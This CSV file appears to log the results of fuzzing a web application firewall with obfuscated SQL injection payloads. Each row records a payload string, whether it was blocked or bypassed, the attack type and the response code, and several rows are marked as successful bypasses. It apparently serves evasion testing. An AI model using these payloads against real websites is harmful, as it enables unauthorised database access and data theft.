Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@!=.1+or%0b!%0b{x%0b(select+1)}=1=+(!%0b{`if`,Blocked,No,None,Unknown,0.0106,71.11,No,403
0%27<@=1.+||+{`if`%0b1}=1+like+{a%0b1}=1+or',Bypassed,No,None,Unknown,0.0294,71.11,No,500
0'<@=1+or+not%7efalse=+(!%0b{`if`+1}=1),Bypassed,No,None,booleanAtk,0.021,71.11,No,500
0%27<@=1%0b||+not%0b{`if`+1}=1=+(!+{a%0b,Bypassed,Yes,unionAtk,Unknown,0.0091,71.11,No,200
0%27<@!=1.+or%0bnot+true=%0b(!+1)%0b||,Bypassed,Yes,unionAtk,booleanAtk,0.0137,71.11,No,200
0%27<@!=1%0bor+not%0b{x+(select%0b1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0147,71.11,No,200
0%27<@=.1+||+not%0b{`if`+1}=1=+(!+{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0152,71.11,No,200
0'<@!=1%0bor+not%0b{x%0b(select+1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0169,71.11,No,500
0%27<@!=1+||+!+{x%0b(select+1)}=1=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0163,71.11,No,200
0'<@!=1.%0bor+!%0b{`if`+1}=1=+(not+{`if`+,Bypassed,No,None,Unknown,0.0154,71.11,No,500
0%27<@!=.1+or%0b{a+1}=1%0blike+{x+(select+1)}=1+or%27,Blocked,No,None,Unknown,0.0208,71.11,No,403
0%27<@!=1+||%0bnot%0b{x%0b(select+1)}=1=+(!+{x,Bypassed,Yes,unionAtk,Unknown,0.02,71.11,No,200
0%27<@=1%0bor+not%7efalse=%0b(!%0b{a%0b1}=1),Bypassed,Yes,unionAtk,booleanAtk,0.0267,71.11,No,200
0%27<@!=1.+||%0b{x%0b(select+1)}=1%0blike+1+or',Bypassed,No,None,Unknown,0.0091,71.11,No,500
0'<@!=1%0bor+not%0b{x+(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0107,71.11,No,500
0%27<@=1+||+!~0=+(!%7e0)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0088,71.11,No,200
0'<@!=.1%0bor+not+true=%0b(not~false)+||,Bypassed,No,None,booleanAtk,0.0065,71.11,No,500
0%27<@!=.1+or%0bnot+{`if`%0b1}=1=+(!+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0198,69.83,No,200
0%27<@!=1.%0b||+not%0b{x+(select+1)}=1=%0b(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0151,70.23,No,200
0%27<@!=1+or+not+{x+(select+1)}=1=+(!+{x,Blocked,No,None,Unknown,0.0072,70.23,No,403
0%27<@=.1+or+!+{`if`+1}=1=%0b(!+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0101,70.23,No,200
0%27<@=1.+or+!%0btrue=+(!+{x%0b(select%0b1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0106,70.23,No,200
0%27<@=.1%0b||+!+1=%0b(!+{a+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0121,70.23,No,200
0%27<@=1+||%0b!+{a%0b1}=1=%0b(not+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0137,70.23,No,200
